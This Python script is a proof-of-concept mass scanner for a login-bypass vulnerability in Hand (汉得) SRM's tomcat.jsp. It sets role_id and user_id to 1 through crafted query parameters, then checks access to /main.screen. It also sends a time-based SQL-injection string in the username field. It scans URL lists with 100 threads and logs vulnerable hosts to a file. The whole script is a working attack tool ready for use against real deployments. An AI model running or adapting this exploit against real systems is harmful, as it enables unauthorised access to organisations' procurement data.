import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def banner():
    test = """汉得SRMtomcat.jsp登录绕过"""
    print(test)
def poc(target):
    payload1 = '/tomcat.jsp?dataName=role_id&dataValue=1'
    payload2 = '/tomcat.jsp?dataName=user_id&dataValue=1'
    payload3 = '/main.screen'
    data = "captcha=&password=21232f297a57a5a743894a0e4a801fc3&username=admin'and(select*from(select+sleep(5))a)='"
    try:
        res1 = requests.get(url=target+payload1,data=data,verify=False, timeout=5)
        if res1.status_code == 200 and 'role_id = 1' in res1.text:
            res2 = requests.get(url=target+payload2, data=data, verify=False, timeout=5)
            if res2.status_code == 200 and 'user_id = 1' in res2.text:
                res3 = requests.get(url=target+payload3,data=data, verify=False, timeout=5 )
                if res3.status_code == 200:
                    print(f"[+]{target}存在登录绕过漏洞")
                    with open("hande_result.txt","a",encoding='utf-8') as f:
                        f.write(f"{target}存在登录绕过漏洞\n")
                else:
                    print(f"[-]{target}不存在登录绕过漏洞")
    except Exception as e:
        print(f"{target}可能存在登录绕过漏洞请手工测试")

def main():
    banner()
    parse = argparse.ArgumentParser(description="汉得SRM tomcat.jsp 登录绕过漏洞")
    parse.add_argument('-u','--url',dest='url',type=str,help='Please enter url')
    parse.add_argument('-f','--file',dest='file',type=str,help='Please enter file')
    args = parse.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n',''))
            mp = Pool(100)
            mp.map(poc,url_list)
            mp.close()
            mp.join()
    else:
        print(f"Usage:\n\tpython3 {sys.argv[0]} -h or --help")
if __name__ == '__main__':
    """程序入口"""
    main()